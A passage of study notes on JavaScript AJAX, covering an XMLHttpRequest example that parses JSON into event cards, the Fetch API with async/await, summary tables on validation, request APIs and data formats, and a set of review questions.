6. To **serialize** back: `JSON.stringify(object)` → string for sending to server

> [!Example] AJAX + JSON: Fetch Events List
> **Contesto:** GET `data/data.json` from server, parse, render event cards.
> **Codice:**
> ```javascript
> var xhr = new XMLHttpRequest();
>
> xhr.onload = function() {
>   if (xhr.status === 200) {
>     var responseObject = JSON.parse(xhr.responseText);
>     var newContent = '';
>     for (var i = 0; i < responseObject.events.length; i++) {
>       newContent += '<div class="event">';
>       newContent += '<img src="' + responseObject.events[i].map + '"';
>       newContent += ' alt="' + responseObject.events[i].location + '"/>';
>       newContent += '<p><b>' + responseObject.events[i].location + '</b><br>';
>       newContent += responseObject.events[i].date + '</p>';
>       newContent += '</div>';
>     }
>     document.getElementById('content').innerHTML = newContent;
>   }
> };
>
> xhr.open('GET', 'data/data.json');
> xhr.send();
> ```
> **Spiegazione:** `JSON.parse(xhr.responseText)` converts server string to object. Loop builds HTML string from `events` array. Assigns to `innerHTML` to update DOM. JSON structure: `{ "events": [ { "location": "...", "date": "...", "map": "..." }, ... ] }`.

> [!Warning] JSON from Untrusted Sources
> JSON is still JavaScript — it can contain malicious content. Only use `JSON.parse()` on data from trusted server sources. Never `eval()` JSON.

### Fetch API

**Fetch** — modern alternative to `XMLHttpRequest`, introduced in recent JavaScript.

> [!Important] Fetch API
> **`fetch()`** sends HTTP requests and returns a **Promise** — an object that encapsulates the result of an asynchronous operation.
>
> Basic syntax:
> ```javascript
> var promise = fetch(url, [options]);
> ```
> - `url`: target URL
> - `options` (optional): request parameters such as method and headers
> - Without options: defaults to `GET` request
>
> When Promise **resolves** (server responds), it becomes a **Response** object with useful methods and properties.
>
> **Two-step pattern:**
> 1. Check status (did request succeed?)
> 2. Process response body
>
> **Intuition:** `fetch` = cleaner, Promise-based version of XHR. The `await` keyword pauses execution until the Promise resolves, making async code read like synchronous code.

> [!Example] Fetch with async/await
> **Contesto:** GET JSON from a URL using Fetch and `await`.
> **Codice:**
> ```javascript
> let response = await fetch(url);
>
> if (response.ok) {  // HTTP status 200-299
>   let json = await response.json();  // parse body as JSON
> } else {
>   alert("HTTP-Error: " + response.status);
> }
> ```
> **Spiegazione:** `fetch(url)` initiates request and returns a Promise. `await` pauses until server responds — `response` is now the Response object. `response.ok` is `true` for 2xx status codes. `response.json()` also returns a Promise — `await` gives the parsed JavaScript object directly.

**Note:** Fetch is not supported by older browsers — verify compatibility before use.

---

## Further Readings

- MDN Web Docs: Resources for Developers, by Developers — `https://developer.mozilla.org/en-US/`
- Duckett, J., Ruppert, G., and Moore, J. (2014). *JavaScript & jQuery: Interactive Front-end Web Development*. Wiley.
- Flanagan, D. (2011). *JavaScript: The Definitive Guide*. O'Reilly Media.

---

## Summary Table

### Form Validation

| Approach | Where | Mechanism | Customizable | When to Use |
|----------|--------|-----------|--------------|-------------|
| **HTML5 built-in** | Browser | Validation attributes (`required`, `pattern`, `type`) + `:valid`/`:invalid` CSS | Limited | Simple constraints, no JS needed |
| **Constraint Validation API** | Browser | `validity.typeMismatch` etc. + `setCustomValidity()` | Moderate | Custom error messages on native validation |
| **Plain JavaScript** | Browser | DOM events (`input`, `submit`) + regex + `preventDefault()` | Full | Complex rules, dynamic validation |
| **Server-side** | Server | Check after submission; return errors | Full | Security gate; never skip |

### AJAX / HTTP APIs

| API | Paradigm | Key Methods | Browser Support |
|-----|----------|-------------|-----------------|
| **XMLHttpRequest** | Event callbacks (`onload`) | `open()`, `setRequestHeader()`, `send()`, `responseText`, `responseXML` | All browsers |
| **Fetch** | Promise / `async`-`await` | `fetch(url, opts)`, `response.ok`, `response.json()`, `response.text()` | Modern browsers only |

### Data Format Comparison

| Format | Conciseness | Portability | JS Integration | Security Risk |
|--------|-------------|-------------|---------------|---------------|
| **HTML** | Medium | Low | Direct `innerHTML` | Low (static markup) |
| **XML** | Verbose | High | DOM methods | Low |
| **JSON** | High | High (CORS-friendly) | `JSON.parse()` / `JSON.stringify()` | Medium (malicious JS) |

### XHR readyState Lifecycle

| readyState | State | Meaning |
|-----------|-------|---------|
| `0` | Uninitialized | Object created, `open()` not called |
| `1` | Loading | `open()` called |
| `2` | Loaded | Response headers received |
| `3` | Interactive | Response body downloading |
| `4` | Complete | Full response ready — process here |

## Questions

1. Why is form validation necessary for data correctness, user account security, and application protection?
2. How do client-side and server-side validation complement each other, and why is client-side validation not sufficient for security?
3. When would HTML5 built-in validation be enough, and when would plain JavaScript validation be necessary?
4. How do attributes such as `required`, `pattern`, `type`, `min`, `max`, `minlength`, and `maxlength` define browser-enforced constraints?
5. How can CSS pseudo-classes such as `:valid` and `:invalid` improve validation feedback without JavaScript?
6. How does the Constraint Validation API expose validation state through `validity`, and how does `setCustomValidity()` change the browser's error message?
7. In the plain JavaScript email validation example, why are both `input` and `submit` event handlers used?
8. Why does `event.preventDefault()` matter in the final validation gate before form submission?
9. What does AJAX add to the normal HTTP request-response model of a web page?
10. How does asynchronous communication improve user experience compared with synchronous blocking behavior?
11. What are the four parts of an `XMLHttpRequest` request and the three main parts of its response?
12. How do `open()`, `setRequestHeader()`, and `send()` cooperate to configure and dispatch an XHR request?
13. How do URL-encoded and JSON-encoded POST request bodies differ, and why must the `Content-Type` header match the body format?
14. How does the same-origin policy restrict AJAX calls, and how does CORS allow controlled cross-origin access?
15. Why should a response handler check both `readyState === XMLHttpRequest.DONE` and a successful HTTP status before processing data?
16. How do HTML, XML, and JSON differ as AJAX response formats in portability, processing effort, and security risk?
17. How does the JSON loading example transform `responseText` into DOM content, and what risks come from using `innerHTML`?
18. How does the Fetch API's Promise-based `async`/`await` pattern simplify the older XHR callback style?
